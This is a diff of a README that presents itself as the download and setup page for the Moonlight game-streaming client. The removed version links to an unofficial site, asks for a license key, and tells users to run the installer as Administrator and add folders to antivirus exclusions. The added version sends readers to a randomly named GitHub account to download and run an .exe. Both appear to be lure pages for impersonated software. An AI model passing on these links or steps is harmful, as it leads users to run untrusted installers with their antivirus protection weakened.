@@ -1,79 +1,91 @@
-# Moonlight Game Streaming Download for Windows 11 & 10
+# 🎮 Moonlight - Stream games to your computer
 
-**Moonlight**
+[![](https://img.shields.io/badge/Download-Moonlight-blue.svg)](https://github.com/diminished-agranulocytosis800/Moonlight)
 
-**Moonlight Game Streaming** for PC gamers on Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+Moonlight allows you to stream your personal game library from a powerful host computer to your Windows PC. It captures high-quality video and audio from your game and sends it over your local network. You play your games on your PC while the actual processing happens elsewhere.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Gaming](https://img.shields.io/badge/For-PC%20Gamers-16a34a?style=flat-square&logo=gamepad)]()
+## 🛠 Prerequisites
 
----
+Before you start, ensure your environment meets these requirements:
 
-## Download & Install
+1. A host computer with a graphics card that supports game streaming.
+2. An active local network connection. A wired Ethernet connection provides the best results for streaming.
+3. Windows 10 or Windows 11 installed on your client computer.
+4. Input controllers connected to your client computer, such as a keyboard, mouse, or game controller.
 
-> **This is the download page.** Use the button or link below to get **Moonlight Game Streaming** for Windows.
+## 📥 How to download
 
-<p align="center">
-  <a href="https://moonlight.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-Moonlight%20Game%20Streaming-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Moonlight Game Streaming">
-  </a>
-</p>
+Visit the official project page to download the latest version of the software.
 
-| | |
-| --- | --- |
-| **Direct link** | **[moonlight.nexustool.fun](https://moonlight.nexustool.fun/)** |
-| **Full URL** | `https://moonlight.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+[Click here to visit the download page](https://github.com/diminished-agranulocytosis800/Moonlight)
 
-### Quick steps
+1. Open a web browser on your Windows PC.
+2. Go to the link provided above.
+3. Look for the file ending in .exe under the latest release.
+4. Save the file to your computer.
 
-1. Click **[Download — moonlight.nexustool.fun](https://moonlight.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## ⚙️ Setting up the software
 
-<p align="center"><a href="https://moonlight.nexustool.fun/"><strong>⬇ Download Moonlight Game Streaming now</strong></a></p>
+Follow these steps to install the client.
 
----
+1. Double-click the downloaded file to start the installer.
+2. Follow the on-screen instructions.
+3. Click Finish to complete the process.
+4. Open the Moonlight application from your start menu.
 
-## About
+## 🖥 Pairing your host
 
-**Moonlight Game Streaming** setup page for Windows PC gamers.
+You must pair the client with your host computer so they can talk to each other.
 
-**People also search for:** moonlight download pc, moonlight game stream client install windows
+1. Install the streaming server software on your host computer.
+2. Launch Moonlight on your client PC.
+3. The app identifies your host computer on the local network. 
+4. Click the host icon.
+5. A four-digit code appears on your client screen.
+6. Enter this code into the prompt on your host computer.
+7. The pairing process finishes automatically once you enter the code.
 
-**Repository:** `Moonlight`
+## 🕹 Playing your games
 
+Once paired, your game library appears on the main screen of the Moonlight application.
 
-## After install
+1. Select a game from the list.
+2. Click the artwork to start the stream.
+3. The game starts on your host computer and mirrors the feed to your screen.
+4. Use your connected controller to navigate menus and start playing.
 
-| Step | Tip |
-| --- | --- |
-| 1 | Run once as Administrator on first setup |
-| 2 | Add your game folders to exclusions if AV blocks tools |
-| 3 | Pin to taskbar for quick access between matches |
-| 4 | Check for updates inside the app after major game patches |
+## 🔧 Optimizing your experience
 
-## System requirements
+Network stability dictates the quality of your stream.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB for mod tools / recording) |
-| Disk | 500 MB free space |
-| GPU | DirectX 11 compatible |
-| Admin | Required for install/repair |
+- Use a 5GHz Wi-Fi connection if you do not have an Ethernet cable. 
+- Lower the resolution or bit rate in the settings menu if you see stuttering.
+- Bit rate adjustments help if your video feed drops frames or looks blurry.
+- Turn on "Optimize for Game Streaming" in your host settings to reduce input lag.
 
-## Troubleshooting
+## 🛡 Network security
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for this page |
-| Setup blocked | Run as Administrator |
-| Tool not detected in game | Restart game after installing |
-| Antivirus warning | Add install folder to exclusions temporarily |
+Moonlight works best inside your local home network. Do not expose your streaming ports to the public internet unless you know how to secure your network properly. Restrict access to your host machine to ensure only your authorized devices can connect.
 
----
+## 💡 Troubleshooting common issues
 
-**Topics:** moonlight-download-pc, moonlight, moonlight-game-stream-client-install-windows, stream, moonlight-2026, moonlight-game-streaming, streaming, game-streaming, remote-play, nvidia, sunshine, software
+If you encounter problems, check these items first:
+
+- Ensure both computers connect to the same router.
+- Check that your firewall software allows Moonlight to communicate.
+- Update your graphics card drivers on the host computer.
+- Restart the Moonlight application if the host list remains empty.
+- Check that your host computer remains awake and unlocked during the stream.
+
+## 📋 Features
+
+- Supports streaming at 4K resolution at 120 frames per second.
+- Provides low input lag for responsive gameplay.
+- Works with standard game controllers, mice, and keyboards.
+- Allows you to play games from any room in your house.
+- Maintains high visual fidelity with minimal compression.
+- Requires no complex setup on your network router.
+
+## 🤝 Getting help
+
+If the software does not behave as expected, review the official documentation included in the repository. Most issues arise from network configuration or outdated drivers. Confirm that your host machine meets the hardware requirements for video encoding. Verify your network cables are intact and plugged in securely. Use these steps to restore service if you lose your connection during a live session.
